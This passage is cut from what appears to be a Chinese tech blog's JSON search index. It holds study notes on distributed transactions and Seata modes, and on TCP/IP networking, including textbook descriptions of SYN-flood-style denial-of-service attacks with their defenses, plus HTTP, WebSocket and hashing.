\nTask可以通过Stream启动，实现方法是在Task项目中创建一个Sink来监听包含TaskLaunchRequest的消息实现的。\n分布式事务概念ACID说到数据库事务就不得不说，数据库事务中的四大特性，ACID:\n\nA（Atomicity，原子性）：事务作为一个整体被执行，要么全部成功，要么全部失败。\n\nC（Consistency，一致性）：事务执行之前和执行之后数据（如数据库中的数据）都必须处于一致性状态。\n如果事务成功地完成，那么系统中所有变化将正确地应用，系统处于有效状态。如果在事务中出现错误，那么系统中的所有变化将自动地回滚，系统返回到原始状态。\n\nI（Isolation，隔离性）：一个事务的中间状态对其他事务是不可见的。\n\nD（Durability，持久性）：事务成功完成后，即使在系统出现故障时，对数据的更改仍然存在并且不会撤消。\n\n\nBASEBASE理论是Basically Available(基本可用)，Soft State（软状态）和Eventually Consistent（最终一致性）三个短语的缩写。\n其核心思想是：\n\n既是无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。\n\n分布式事务解决方案2PC2PC（两阶段提交协议）将事务分成两个阶段：\n\n准备阶段（Prepare Phase）:事务管理器给每个参与者发送Prepare消息，每个数据库参与者在本地执行事务，并写本地的Undo&#x2F;Redo日志，此时事务没有提交。\nUndo log是记录修改前的数据，用于数据库回滚，Redo log记录修改后的数据，用于提交事务后写入数据的文件。\n\n提交阶段（Commit Phase）:如果事务管理器收到了参与者的执行失败或者超时消息时，直接给每个参与者发送回滚（Rollback）消息；否则发送提交（Commit）消息。参与者根据事务管理器指令进行提交或者回滚操作，并释放事务处理过程中使用的资源。\n\n\nTCCTCC将事务分成三个阶段：\n\nTry阶段（Try）：对业务系统进行检测及预留资源。\n确认阶段（Confirm）：对业务做确认提交。\n撤销阶段（Cancel）：撤销事务。\n\nTCC采用的是补偿机制，核心思想是针对每个操作，都要编写一个与其对应的确认和补偿（撤销）操作逻辑。\nSeataSeata 是一款开源的分布式事务解决方案，致力于提供高性能和简单易用的分布式事务服务。\nSeata术语\nTC (Transaction Coordinator) - 事务协调者 - Seata Server\n\n维护全局和分支事务的状态，驱动全局事务提交或回滚。\n\nTM (Transaction Manager) - 事务管理器\n\n定义全局事务的范围：开始全局事务、提交或回滚全局事务。\n\nRM (Resource Manager) - 资源管理器\n\n管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。\n事务模式Seata 将为用户提供了 AT、TCC、SAGA 和 XA 事务模式。\nAT 模式Seata AT 模式是一种非侵入式的分布式事务解决方案，Seata 在内部做了对数据库操作的代理层，我们使用 Seata AT 模式时，实际上用的是 Seata 自带的数据源代理 DataSourceProxy，Seata 在这层代理中加入了很多逻辑，比如插入回滚 undo_log 日志，检查全局锁等。\nAT 模式是2PC的演变：\n\n一阶段\n在一阶段中，Seata会拦截“业务SQL”，首先解析SQL语义，找到要更新的业务数据，在数据更新前，保存下”undo log”，然后执行“业务SQL”更新数据，更新之后保存数据“redo log”，最后生成锁，这些操作都是在本地数据库事务内完成，这样保证了一阶段的原子性。\n\n二阶段\n相对一阶段，二阶段比较简单，负责整体的回滚和提交，如果之前的一阶段中有本地事务没有通过吗，那么就执行全局回滚，否则执行全局提交，回滚用到的就是一阶段记录的“undo log”，通过回滚记录生成反向更新SQL并执行，已完成分支事务的回滚，当然事务完成后释放所有资源和删除所有日志。\n\n\n性能：高\n模式:：AP，存在数据不一致的中间状态\n难易程度：简单，靠SEATA自己解析反向SQL并回滚\n使用要求：\n\n所有服务与数据库必须要自己拥有管理权，因为要创建UNDO_LOG表\n\n应用场景：\n\n高并发互联网应用，允许数据出现短时不一致，可通过对账程序或补录来保证最终一致性。\n\nTCC模式TCC是Try-尝试、Confirm-确认、Cancel-取消Try尝试阶段，对资源进行锁定。Confirm 确认阶段，对资源进行确认，完成操作Cancel 取消阶段，对资源进行还原，取消操作\n实现原理\n\n在代码与数据表中扩展字段，实现对数据资源的锁定。\n\n性能：好\n模式：AP，存在数据不一致的中间状态\n难易程度：复杂，SEATATC只负责全局事务的提交与回滚指令，具体的回滚处理全靠程序员自己实现\n使用要求：\n\n所有服务与数据库必须要自己拥有管理权\n\n支持异构数据库，可以使用不同选型实现\n\n\n应用场景：\n\n高并发互联网应用，允许数据出现短时不一致，于对账程序或补录来保证最终一致性。\n\nSAGA模式Saga模式是SEATA提供的长事务解决方案，在Saga模式中，业务流程中每个参与者都提交本地事务，当出现某一个参与者失败，则补偿前面已经成功的参与者，一阶段的正向服务和二阶段的补偿服务都由业务开发实现。\n性能：不一定，取决于三方服务\n模式：AP，存在数据不一致的中间状态\n难易程度：复杂，提交与回滚流程全靠程序员编排\n使用要求：\n\n在当前架构引入状态机机制，类似于工作流\n\n无法保证隔离性\n\n\n应用场景：\n\n需要与第三方交互时才会考虑，例如:调用支付宝支付接口→出库失败-&gt;调用支付宝退款接口\n\nXA模式基于数据库的XA协议来实现2PC又称为XA方案。\n性能：低\n模式：CP，强一致性\n难易程度：简单，基于数据库自带特性实现，无需改表\n使用要求：\n\n使用支持XA方案的关系型数据库（(主流都支持)\n\n应用场景：\n\n金融行业，并发量不大，但数据很重要的项目\n\n使用方法以AT模式为例：\n\n创建undo_log日志\n对Seata两个主要的配置文件file.config和registry.config\n添加pom依赖seata-spring-boot-starter\n在需要开启分布式事务的业务方法上添加注解@GlobalTransactional\n\nReferences\n胡劲寒. 极简Spring Cloud实战. 北京: 机械工业出版社, 2019.\n\n开课吧,李伟杰,刘雪松,刘自强,王超. Spring Cloud Alibaba微服务开发从入门到实战.\n\nhttps://github.com/alibaba/spring-cloud-alibaba/wiki/Sentinel\n\nhttps://spring-cloud-alibaba-group.github.io/github-pages/hoxton/en-us/index.html\n\nhttps://javaguide.cn/high-performance/load-balancing.html\n\n\n","categories":["IT"],"tags":["Spring Cloud"]},{"title":"计算机网络","url":"/2023/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","content":"TCP&#x2F;IP五层网络模型\n应用层：负责处理应用程序的特定通信细节。常见的应用层协议有HTTP（用于Web浏览器和服务器之间的通信）、SMTP（用于发送和接收电子邮件）和FTP（用于文件传输）等。\n传输层：负责在网络中传输数据。主要有两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。TCP提供可靠的、面向连接的数据传输，确保数据完整性和顺序；UDP提供不可靠的、无连接的数据传输，速度快但可能丢失数据。\n网络层：负责将数据包在网络中进行路由和寻址。互联网协议（IP）是网络层的核心协议，负责将数据包传输到目标设备。此外，还有一些辅助协议，如ICMP（用于诊断网络问题）和IGMP（用于多播通信）等。\n数据链路层：负责在同一网络中传输数据帧。数据链路层协议负责将网络层的IP数据包封装为数据帧，并通过物理介质进行传输。常见的数据链路层协议有以太网、Wi-Fi和PPP等。\n物理层：负责在物理介质上进行数据传输。物理层定义了网络设备之间的电气、机械和时序规范，以及数据在物理介质上的编码方式。常见的物理介质有双绞线、光纤和无线电波等。\n\nTCPTCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的传输协议。\n报文格式TCP报文（也称为TCP段或TCP数据包）是TCP协议中用于在网络中传输数据的基本单位。TCP报文包含了一个TCP首部和可选的数据部分。\nTCP报文的首部格式如下：\n\n源端口（Source Port，16位）：表示报文发送方的端口号。\n目的端口（Destination Port，16位）：表示报文接收方的端口号。\n序列号（Sequence Number，32位）：表示报文中数据的第一个字节的序列号。是TCP报文中每个字节的唯一编号。当发送方发送一个TCP报文时，它会为报文中的第一个字节分配一个序列号。序列号的主要作用是帮助接收方对乱序、重复或丢失的报文进行排序和处理，从而确保数据的顺序和完整性。\n确认号（Acknowledgment Number，32位）：表示期望收到对方下一个报文的序列号，只有当ACK标志位被设置时才有效。\n数据偏移（Data Offset，4位）：表示TCP首部的长度，以32位字（4字节）为单位。\n保留（Reserved，6位）：保留位，未使用，设置为0。\n控制位（Control Bits，6位）：包含了一系列控制标志，如URG（紧急指针有效）、ACK（确认号有效）、PSH（推送）、RST（复位连接）、SYN（同步序列号）、FIN（结束连接）等。\n窗口大小（Window Size，16位）：表示发送方当前可接收的数据量（以字节为单位）。\n校验和（Checksum，16位）：用于检测报文在传输过程中是否发生错误。\n紧急指针（Urgent Pointer，16位）：仅在URG标志位被设置时有效，表示紧急数据在报文中的偏移量。\n选项（Options，可选，长度可变）：包含了一些可选的TCP功能，如最大报文长度（MSS）、窗口扩大因子（Window Scale）和选择性确认（SACK）等。\n填充（Padding，可选，长度可变）：用于保证TCP首部的长度为32位字的整数倍。\n\nTCP报文首部后面的数据部分包含了实际要传输的数据。TCP通过将数据划分为多个报文并为每个报文分配一个唯一的序列号，实现了可靠的、面向连接的数据传输。\nTCP连接的状态TCP连接的建立、数据传输和断开过程涉及多种状态。以下是TCP连接状态的详细说明：\n\nCLOSED：初始状态，表示没有建立连接，也没有活动的连接。\nLISTEN：服务器处于侦听状态，等待客户端发送连接请求。这是服务器主动打开的初始状态。\nSYN_SENT：客户端发送SYN报文后，进入SYN_SENT状态。这表示客户端已发送连接请求，等待服务器的回应。\nSYN_RECEIVED：服务器收到客户端的SYN报文后，发送自己的SYN报文和确认ACK报文，进入SYN_RECEIVED状态。这表示服务器已确认客户端的连接请求，等待客户端确认。\nESTABLISHED：双方都收到并确认对方的SYN报文后，连接建立成功，进入ESTABLISHED状态。此时，双方可以开始数据传输。\nFIN_WAIT_1：当客户端完成数据传输并发送FIN报文后，进入FIN_WAIT_1状态。这表示客户端请求关闭连接，等待服务器的确认。\nFIN_WAIT_2：客户端收到服务器对FIN报文的确认ACK报文后，进入FIN_WAIT_2状态。此时，客户端等待服务器发送自己的FIN报文，表示服务器已完成数据传输。\nCLOSE_WAIT：服务器收到客户端的FIN报文后，进入CLOSE_WAIT状态。这表示服务器已确认客户端的关闭请求，但仍需等待服务器完成数据传输。\nCLOSING：当双方同时发送FIN报文时，客户端会在收到服务器的FIN报文前进入CLOSING状态。这表示双方都请求关闭连接，但客户端尚未收到服务器对其FIN报文的确认。\nLAST_ACK：服务器在发送FIN报文后，进入LAST_ACK状态。这表示服务器等待客户端对其FIN报文的确认。\nTIME_WAIT：客户端收到服务器的FIN报文并确认后，进入TIME_WAIT状态。客户端会在这个状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保服务器收到对其FIN报文的确认。之后，客户端进入CLOSED状态，关闭连接。\nCLOSED：连接已完全关闭，可以释放所有相关资源。\n\n这些状态描述了TCP连接的整个生命周期，包括连接建立、数据传输和连接关闭\n三次握手三次握手的过程TCP三次握手（Three-Way Handshake）是建立TCP连接的过程，通过三次交换控制报文来确认双方的收发能力和同步双方的初始序列号。以下是TCP三次握手的详细步骤：\n\nSYN：客户端发送一个TCP报文，其中SYN（Synchronize Sequence Numbers，同步序列号）标志位被设置为1，表示这是一个连接请求。客户端还会选择一个初始序列号x，并将其放入报文的序列号字段。\n\nSYN-ACK：服务器收到客户端的SYN报文后，会发送一个响应报文。在这个报文中，SYN标志位和ACK（Acknowledge，确认）标志位都被设置为1。服务器也会选择一个初始序列号y，并将其放入报文的序列号字段。同时，服务器会将客户端报文序列号x加1，并将结果放入报文的确认号字段，表示期望收到客户端下一个报文的序列号。\n\nACK：客户端收到服务器的SYN-ACK报文后，会发送一个ACK报文。在这个报文中，ACK标志位被设置为1。客户端会将服务器报文的序列号y加1，并将结果放入报文的确认号字段，表示期望收到服务器下一个报文的序列号。至此，TCP三次握手完成，双方建立起了连接。\n\n\n在TCP三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号。\n总之，TCP三次握手是建立TCP连接的过程，包括以下三个步骤：\n\n客户端发送SYN报文，请求连接，并设置初始序列号x。\n服务器回复SYN-ACK报文，确认连接请求，设置初始序列号y，确认号为x+1。\n客户端发送ACK报文，确认服务器的SYN-ACK，确认号为y+1。\n\n握手完成后，TCP连接建立，数据传输开始。\n三次而不是两次握手的原因TCP三次握手的主要目的是在不可靠的网络环境中实现可靠的连接建立。三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。这里详细说明为什么需要三次握手：\n\n确认收发能力：通过三次握手，客户端和服务器可以确认对方的收发能力。首先，客户端发送SYN报文表示其具备发送能力；其次，服务器回复SYN-ACK报文表示其具备接收和发送能力；最后，客户端发送ACK报文表示其具备接收能力。这个过程确保了双方在连接建立后都能正常地收发数据。\n\n同步初始序列号：在TCP协议中，每个字节都有唯一的序列号。为了实现可靠的数据传输，客户端和服务器需要在建立连接时同步各自的初始序列号。在三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号，并在握手过程中交换这些序列号。这样，双方都能知道对方期望收到的第一个字节的序列号，从而为后续的数据传输做好准备。\n\n\n如果只进行两次握手，客户端和服务器之间的连接可能不可靠。例如，客户端发送SYN报文后，服务器回复SYN-ACK报文，但无法确认客户端是否具备接收能力。这可能导致服务器发送的数据无法被客户端正确接收，从而影响通信质量。因此，为了实现可靠的连接建立，TCP协议采用了三次握手的机制。\nSYN攻击SYN攻击（也称为TCP SYN泛洪攻击）是一种利用TCP协议三次握手机制进行的拒绝服务（DoS）攻击。攻击者向目标服务器发送大量伪造源IP地址的SYN报文，目的是消耗服务器的资源，使正常用户无法访问该服务器。以下是SYN攻击的详细过程：\n\n攻击者向目标服务器发送大量SYN报文，这些报文的源IP地址是伪造的。每个SYN报文都表示一个连接请求。\n目标服务器收到SYN报文后，会为每个报文分配一个半连接（half-open connection），并回复SYN-ACK报文。由于源IP地址是伪造的，这些SYN-ACK报文无法到达真正的发送方。\n目标服务器等待攻击者发送ACK报文以完成握手过程。然而，由于源IP地址是伪造的，ACK报文永远不会到达。目标服务器会在一定时间内保留这些半连接，直到超时。\n攻击者持续发送大量伪造的SYN报文，导致目标服务器的资源耗尽，从而无法处理正常用户的连接请求。\n\nSYN攻击的危害在于它可以通过较少的资源（例如，较低的带宽和较少的报文）消耗大量服务器资源，从而实现拒绝服务的目的。防御SYN攻击的方法包括：\n\n缩短超时时间：减少服务器等待ACK报文的时间，以便更快地释放半连接资源。\n增加半连接队列大小：增加服务器可以处理的半连接数量，以应对大量的SYN报文。\nSYN cookies：服务器在回复SYN-ACK报文时，使用一种称为SYN cookies的技术生成确认号，而不是分配半连接。当收到有效的ACK报文时，服务器可以通过确认号重新构建连接状态，从而避免为伪造的SYN报文分配资源。\n过滤伪造的IP地址：部署网络设备（例如防火墙和入侵检测系统）来识别并阻止伪造的IP地址，以减少SYN攻击的影响。\n\n尽管SYN攻击是一种比较古老的攻击方式，但它仍然具有一定的威胁。通过采用合适的防御措施，可以降低SYN攻击对服务器的影响。\nLand攻击Land攻击是一种DoS（拒绝服务）攻击类型，这种攻击利用TCP&#x2F;IP协议的漏洞，通过发送伪造的数据包来使目标系统无法正常工作。Land攻击的特点是发送的数据包的源IP地址和目标IP地址相同，同时源端口和目标端口也相同。\nLand攻击的过程如下：\n\n攻击者构造一个伪造的TCP数据包，将源IP地址和目标IP地址设置为目标系统的IP地址，同时将源端口和目标端口设置为相同的端口号。\n攻击者发送这个伪造的数据包到目标系统。\n目标系统在收到这个数据包后，由于源IP地址和目标IP地址相同，尝试与自身建立连接。这会导致目标系统的资源消耗，进而可能导致系统崩溃或无法响应其他合法请求。\n\nLand攻击在20世纪90年代是一种较为常见的攻击手段，但现在大部分操作系统和网络设备已经修复了相关漏洞，不再受此类攻击影响。然而，为了防止潜在的Land攻击，可以采取以下措施：\n\n更新操作系统和网络设备的软件，确保已修复相关漏洞。\n配置防火墙和入侵检测系统（IDS）来识别并过滤伪造的数据包。\n监控网络流量，以检测异常数据包和潜在的攻击行为。\n\nConnection Flood攻击Connection Flood攻击是一种拒绝服务（DoS）攻击类型，其主要目标是消耗目标服务器的连接资源，使其无法处理新的合法连接请求。这种攻击方法通常通过发送大量的连接请求或半打开的连接来实现。\n在Connection Flood攻击中，攻击者通常采取以下步骤：\n\n攻击者向目标服务器发送大量的连接请求，可能使用合法或伪造的IP地址。\n目标服务器在收到连接请求后，尝试为每个请求分配资源，以处理并维护这些连接。\n随着连接数量的增加，目标服务器的资源逐渐耗尽，导致无法处理新的合法连接请求。\n\nConnection Flood攻击可能针对不同的协议和服务，例如HTTP连接泛洪、TCP连接泛洪或TLS&#x2F;SSL连接泛洪。\n为了防御Connection Flood攻击，可以采取以下措施：\n\n限制连接速率：为单个IP地址或子网设置连接速率限制，以防止攻击者短时间内发送大量连接请求。\n连接队列管理：优化连接队列策略，例如缩短超时时间、增加队列大小等，以提高服务器处理连接请求的能力。\n入侵检测和防御系统：部署入侵检测和防御系统（IDPS），以实时监测并阻止Connection Flood攻击。\n负载均衡：通过负载均衡技术将连接请求分发到多个服务器，以减轻单个服务器的压力，并提高整体服务的抗攻击能力。\nIP地址过滤：使用防火墙或其他安全设备过滤来自可疑或恶意IP地址的连接请求。\n应用层防御：针对特定服务或协议的攻击，例如HTTP或TLS&#x2F;SSL连接泛洪，可以使用Web应用防火墙（WAF）或其他应用层防御技术进行防护。\n\n四次挥手四次挥手的过程TCP四次挥手是TCP连接在传输完成后进行断开的过程。TCP（传输控制协议）是一种面向连接的协议，因此在数据传输完成后，需要通过一个四步过程来正常关闭连接。以下是TCP四次挥手的详细步骤：\n\n第一次挥手：客户端向服务器发送一个FIN报文，表示客户端已经完成数据传输，请求关闭连接。此时，客户端进入FIN_WAIT_1状态。\n\n第二次挥手：服务器收到客户端发送的FIN报文后，会发送一个ACK报文确认客户端的FIN报文已收到。此时，服务器进入CLOSE_WAIT状态，而客户端收到ACK报文后进入FIN_WAIT_2状态。\n\n第三次挥手：当服务器完成数据传输后，也会向客户端发送一个FIN报文，表示服务器同意关闭连接。此时，服务器进入LAST_ACK状态。\n\n第四次挥手：客户端在收到服务器的 FIN 报文后，发送 ACK 报文确认并进入 TIME_WAIT 状态。服务器收到 ACK 报文后，立即关闭连接。2 倍 MSL（约 2 分钟）后，客户端关闭连接。\n\n\n要有TIME_WAIT状态的原因 TIME_WAIT状态存在于TCP连接关闭过程中，具有几个重要的原因：\n\n确保最后一个ACK报文被对方接收：在TCP四次挥手过程中，客户端发送最后一个ACK报文确认收到服务器的FIN报文。TIME_WAIT状态确保了这个ACK报文能够被服务器正确接收。如果服务器没有收到这个确认报文，它会重发FIN报文。此时，由于客户端仍处于TIME_WAIT状态，可以再次发送ACK报文进行确认。\n\n处理延迟的数据包：在TIME_WAIT状态期间，客户端可以处理可能延迟到达的数据包。这有助于确保连接关闭前的所有数据包都被正确处理，防止数据丢失或错误。\n\n防止旧连接数据包干扰新连接：TCP连接由源IP、目标IP、源端口和目标端口四元组唯一确定。在某些情况下，相同的四元组可能在短时间内被重新用于新的连接。TIME_WAIT状态可以防止旧连接中仍在网络中传输的数据包干扰新连接。客户端在TIME_WAIT状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保旧连接的数据包从网络中消失。\n\n\n总之，TIME_WAIT状态在TCP连接关闭过程中发挥了重要作用，它确保了最后一个ACK报文被接收、处理延迟数据包和防止旧连接数据包干扰新连接。这有助于维护TCP连接的可靠性和数据传输的完整性。\n关闭连接的需要四次挥手，而建立连接只要三次握手的原因三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。确认过程中间有一个合并的SYN和ACK，所以是三步。\n关闭连接需要四次挥手，因为 TCP 是全双工的，双方需要独立地确认对方已经完成数据发送，服务端收到SYN时可能还不能关闭连接，不能合并ACK和FIN，所以是四步。\n流量控制滑动窗口机制TCP协议使用以字节为单位的滑动窗口协议来控制字节流的发送\n 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口前部的字节已经发送并且收到了确认，那么就将发送窗口向后滑动一定距离，直到第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口前部字节为已经接收到的字节，收到数据并发送确认后，就向后滑动接收窗口，直到接收窗口为0。  \n确认重传机制在TCP中，选择性重传的实现原理主要依赖于选择性确认（Selective Acknowledgment, SACK）机制。SACK是一种TCP扩展，其目的是改进TCP在数据包丢失的情况下的性能。它允许接收方在确认报文中指定已成功接收的不连续数据段，从而使发送方可以更精确地了解哪些报文段需要重传。\nSACK是通过在TCP报文头部添加选项字段来实现的。以下是SACK实现的主要步骤：\n\n协商SACK：在TCP连接建立过程中，双方通过在SYN和SYN-ACK报文中包含SACK-permitted选项来表示支持SACK。\n接收数据并生成SACK块：接收方在接收数据时，记录每个已成功接收的数据段的左边界和右边界，并按照顺序排列。接收方在发送确认报文（ACK）时，会在TCP头部选项字段中加入SACK选项。SACK选项包含一个或多个SACK块，每个SACK块表示一个已成功接收的不连续数据段范围（左边界和右边界）。\n处理SACK报文并重传数据：发送方在收到包含SACK选项的确认报文后，会根据其中的信息判断哪些报文段需要重传。发送方只需要重传那些未被确认的报文段，而已成功接收的数据段不会被重传。\n\n拥塞控制原理TCP维护了一个拥塞窗口（cwnd，congestion window），窗口大小是发送端可以往网络发送的不会产生网络阻塞的字节数\n拥塞控制方法慢启动算法慢启动用于在TCP连接开始时cwnd从初始值1逐渐（指数级）增加数据发送速率和传输窗口大小。发送端为连接维护了一个慢启动阈值（ssthread，slow start thread），一旦慢启动超过了慢启动阈值，TCP就从慢启动切换到拥塞避免算法（线性增加）\n\n当cwnd &lt; ssthread，使用慢启动算法\n当cwnd &gt; ssthread，使用拥塞避免算法\n当cwnd &#x3D; ssthread，既可以使用慢启动算法，也可以使用拥塞避免算法\n\n拥塞避免算法拥塞避免算法的思路是让cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1\n快速恢复算法如果发送方接收到3个或3个以上的重复确认时，就认为网络出现了拥塞，此时将启用快速恢复算法\n当发生超时，不是进行慢启动，而是进行快速恢复，先将ssthread设为cwnd&#x2F;2，再将cwnd设为ssthread，然后执行拥塞避免算法\n快速重传算法如果发送方接收到3个或3个以上的重复确认（duplicate ACK）时，就认为前面发送的数据包已经丢失，立即重传这些数据包而不是等待超时重传，但是在重传之前会先执行快速恢复算法，以减轻网络拥塞\n粘包、拆包TCP粘包和拆包是指在TCP传输过程中，发送方发送的多个小数据包被接收方合并成一个大数据包（粘包），或者一个大数据包被接收方拆分成多个小数据包（拆包）的现象。\n造成TCP粘包和拆包的主要原因是TCP协议是面向流的，发送方和接收方之间没有明显的分界点，数据以字节流的形式进行传输。这就导致了发送方发送的多个小数据包可能会在接收方端被合并成一个大数据包，或者一个大数据包在传输过程中被拆分成多个小数据包。\n为了避免TCP粘包和拆包现象，通常需要进行数据分包和数据拆包处理。数据分包是将待发送的数据按照固定大小的数据块进行分割，以便接收方能够正确接收数据。数据拆包则是将接收到的大数据包拆分成多个小数据包，以便上层应用程序能够正确处理数据。\n常用的TCP粘包和拆包处理方式包括：\n\n固定长度分包：将数据按照固定长度进行分包，接收方按照相同的长度进行接收和处理。\n\n在数据包头部增加数据长度信息：将数据长度信息添加到数据包头部，接收方根据长度信息进行接收和处理。\n\n使用分隔符分包：将不同数据块之间加上特定的分隔符进行分包。\n\n消息头+消息体：在消息头中增加消息体长度字段，接收方先接收消息头中的消息体长度字段，然后根据长度信息接收和处理数据\n\n\n通过这些处理方式，可以有效避免TCP粘包和拆包现象，保证数据传输的正确性和完整性。\nUDPUDP（User Datagram Protocol）是一种无连接、不可靠的传输层协议，它以尽可能少的开销提供了一种面向事务的简单传输服务。相比于TCP协议，UDP协议不具备可靠性和流量控制机制，但是它具有传输速度快、数据包大小灵活等优势，在实时应用场景中得到广泛应用。\nUDP协议的主要特点如下：\n\n无连接：UDP协议不需要进行连接建立和释放操作，直接向目标主机发送数据包即可，因此传输效率较高。\n面向报文：UDP协议对应用层传递的报文既不合并也不拆分，以数据包为单位进行传输。\n无流量控制：UDP协议不具备流量控制机制，发送方按照自己的速度发送数据包，而不考虑接收方的接收能力。\n无拥塞控制：发送方可以按照自己的速度发送数据包，不会对网络拥塞状况进行检测。\n无重传机制：在UDP协议中，如果某个数据包在传输过程中丢失或损坏，UDP协议不会进行重传，也不会通知发送方，是不可靠的。\n\nUDP协议在实时应用场景中得到广泛应用，如视频、语音、游戏等实时性要求较高的应用。由于UDP协议具有传输速度快、数据包大小灵活等优势，能够满足实时应用的要求，并且由于无连接、无可靠性等特点，使得实现简单，成本低廉。但是，也由于UDP协议不具备可靠性和流量控制机制，因此在需要数据传输的可靠性和稳定性的应用场景中，如文件传输、邮件等，通常使用TCP协议来保证传输的可靠性。\nHTTP特点HTTP是明文传输的、无状态的（关闭后客户端和服务端都不会保留任何上一次连接的信息）\n短连接短连接的特点：\n\n是HTTP&#x2F;1.0的默认方式，每次请求都需要重新建立连接，可能导致较高的开销。\n由于连接频繁建立和关闭，服务器可能需要处理大量的连接请求。\n\n短连接的适用场景：\n\n不需要长时间维持连接的场景。\n低频率请求\n\n长连接长连接的特点：\n\n是HTTP&#x2F;1.1的默认方式，允许客户端在一个连接上发送多个请求，而不必每次都重新建立连接。\n减少了重新建立连接的开销\n长连接可能会占用服务器资源，因为连接在使用完后不会立即关闭。\n\n长连接的适用场景：\n\n需要长时间维持连接的场景，如实时应用和高频通信。\n高频率请求\n\n多路复用在HTTP&#x2F;1.1中，每个请求和响应都需要单独的TCP连接。虽然HTTP&#x2F;1.1引入了长连接来减少连接开销，但在每个连接上仍然只能同时处理一个请求。这可能导致队头阻塞问题，即较慢的请求阻塞后续请求的处理。HTTP&#x2F;2通过多路复用解决了这个问题。\n多路复用的特点：\n\n允许在单个TCP连接上同时发送和接收多个请求和响应\n\n状态码HTTP 状态码（HTTP Status Codes）是服务器用于表示客户端请求结果的三位数字。状态码分为五类，各类状态码的含义如下：\n1xx（信息响应）：请求已接收，继续处理。\n2xx（成功）：请求已成功接收、理解和接受。\n3xx（重定向）：需要后续操作才能完成请求。\n4xx（客户端错误）：请求包含错误语法或无法完成。\n5xx（服务器错误）：服务器在处理请求时发生错误。\n\n\n\n状态码\n描述\n\n\n\n100\nContinue: 请求已接收，继续处理。\n\n\n200\nOK: 请求成功，服务器已经处理了请求并返回了所需数据。\n\n\n201\nCreated: 请求成功并已创建了新资源。\n\n\n202\nAccepted: 请求已被接受，但尚未处理。\n\n\n204\nNo Content: 请求成功，但无需返回任何内容。\n\n\n300\nMultiple Choices: 请求的资源有多个表示。\n\n\n301\nMoved Permanently: 请求的资源已被永久移动到新的 URL。\n\n\n302\nFound: 请求的资源临时移动到新的 URL。\n\n\n303\nSee Other: 对于 POST 请求，资源的响应可以在另一个 URL 上找到。\n\n\n304\nNot Modified: 资源自上次请求以来未发生更改。\n\n\n307\nTemporary Redirect: 请求的资源临时移动到新的 URL。\n\n\n308\nPermanent Redirect: 请求的资源已被永久移动到新的 URL。\n\n\n400\nBad Request: 请求格式错误或服务器无法理解请求。\n\n\n401\nUnauthorized: 请求需要认证。客户端应提供认证信息。\n\n\n403\nForbidden: 客户端没有权限访问所请求的资源。\n\n\n404\nNot Found: 服务器找不到请求的资源。\n\n\n405\nMethod Not Allowed: 请求方法（GET、POST 等）对于所请求的资源不允许。\n\n\n500\nInternal Server Error: 服务器在处理请求时遇到内部错误。\n\n\n501\nNot Implemented: 服务器不支持请求所需要的功能。\n\n\n502\nBad Gateway: 作为网关或代理角色的服务器从上游服务器接收到无效响应。\n\n\n503\nService Unavailable: 服务器暂时无法处理请求（由于过载或维护）。\n\n\n504\nGateway Timeout: 作为网关或代理角色的服务器未及时从上游服务器收到请求。\n\n\nWebSocketsWebSocket是一种通信协议，它在单个TCP连接上提供了全双工通信，允许客户端和服务器同时发送和接收消息。。WebSocket协议旨在解决HTTP协议在实时通信场景中的局限性，如低延迟和服务器主动推送消息等。\nWebSocket协议的主要特点如下：\n\n全双工通信：WebSocket允许客户端和服务器在同一时间通过一个连接进行双向通信，而不是像HTTP那样的请求-响应模式。这使得数据传输更加高效，延迟更低。\n\n低延迟：由于WebSocket建立在一个持久的TCP连接上，并减少了传输数据所需的开销，因此在实时应用中具有更低的延迟。\n\n服务器推送：WebSocket允许服务器主动向客户端推送消息，而无需客户端明确请求。这对于实时通知、聊天应用、在线游戏等场景非常有用。\n\n兼容性：WebSocket协议在设计时考虑了与HTTP协议的兼容性，使用HTTP升级请求将普通的HTTP连接升级为WebSocket连接。这意味着WebSocket可以利用现有的HTTP基础设施，如代理服务器和负载均衡器。\n\n\nWebSocket的一些常见应用场景包括：\n\n实时消息传递和聊天应用\n在线游戏\n实时数据推送和更新，如股票行情、体育比分等\n即时协作工具，如在线文档编辑、共享白板等\n物联网（IoT）设备间的通信\n\n密码学哈希算法哈希算法（Hash algorithm）是密码学领域中的一种重要技术，它将任意长度的输入数据（通常称为消息）映射到固定长度的输出（通常称为哈希值、摘要或指纹）。哈希算法具有许多实际应用，如数据完整性验证、消息认证、数字签名以及密码存储等。\n一个优秀的哈希算法应具有以下特性：\n\n确定性：对于相同的输入，哈希算法总是产生相同的输出。\n高效性：哈希算法应能快速地计算出输入数据的哈希值。\n单向性（预映像抗性）：给定一个哈希值，计算出原始输入数据应是非常困难的。\n二次预映像抗性：给定一个输入数据，找到另一个不同的输入，使其具有相同的哈希值，应该是非常困难的。\n抗碰撞性：找到任意两个不同的输入，它们具有相同的哈希值，应该是非常困难的。\n随机性：哈希值的输出应该看起来是随机的，即使对于相似的输入，它们的哈希值也应该有很大差异。\n\n在密码学中，常用的哈希算法有：\n\nMD5（Message Digest Algorithm 5）：MD5是一种广泛使用的哈希算法，产生128位（16字节）的哈希值。然而，由于已知的安全漏洞，如碰撞攻击，MD5不再被认为是安全的哈希算法。\nSHA-1（Secure Hash Algorithm 1）：SHA-1是一种哈希算法，产生160位（20字节）的哈希值。与MD5类似，由于已知的安全漏洞，如碰撞攻击，SHA-1也不再被认为是安全的哈希算法。\nSHA-2（Secure 